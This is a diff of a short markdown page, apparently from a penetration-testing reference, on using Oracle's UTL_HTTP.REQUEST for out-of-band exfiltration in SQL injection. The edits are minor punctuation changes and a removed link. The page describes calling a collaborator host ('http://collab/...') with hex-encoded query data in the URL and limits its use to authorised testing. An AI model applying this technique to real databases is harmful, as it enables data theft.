@@ -1,6 +1,6 @@
 ---
 title: "Oracle UTL_HTTP in SQL contexts: HTTP egress from the database"
-description: UTL_HTTP.REQUEST and related calls—HTTP out-of-band exfiltration and callback testing from Oracle SQL contexts.
+description: UTL_HTTP.REQUEST and related calls, HTTP out-of-band exfiltration and callback testing from Oracle SQL contexts.
 keywords:
   - UTL_HTTP.REQUEST
   - Oracle HTTP
@@ -11,7 +11,7 @@ keywords:
 
 ## Context
 
-`UTL_HTTP.REQUEST('http://collab/...')` pulls an HTTP URL from the database—embed hex-encoded query fragments in path or query string.
+`UTL_HTTP.REQUEST('http://collab/...')` pulls an HTTP URL from the database, embed hex-encoded query fragments in path or query string.
 ## Technique
 
 Watch for TLS/proxy requirements on hardened estates.
@@ -28,7 +28,3 @@ Watch for TLS/proxy requirements on hardened estates.
 ## Scope
 
 Use only in **authorized** penetration tests, red-team engagements, CTFs, and isolated lab systems.
-
-## See also
-
-- [Out of band (Oracle)](index.md)
